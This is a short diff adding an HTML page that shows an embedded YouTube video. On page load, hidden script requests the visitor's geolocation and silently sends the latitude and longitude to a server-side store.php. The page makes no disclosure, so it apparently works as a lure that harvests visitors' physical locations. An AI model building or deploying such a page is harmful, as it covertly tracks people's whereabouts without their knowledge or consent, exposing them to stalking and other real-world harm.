@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+
+<body onload="getLocation()">
+  <iframe width="560" height="315" src="https://www.youtube.com/embed/i1ojUmdF42U" title="YouTube video player"
+    frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+    allowfullscreen></iframe>
+
+  <p id="demo"></p>
+
+  <script>
+    var x = document.getElementById("demo");
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else {
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
+
+    function showPosition(position) {
+      const xhttp = new XMLHttpRequest();
+      xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+      xhttp.send();
+    }
+  </script>
+
+</body>
+
+</html>
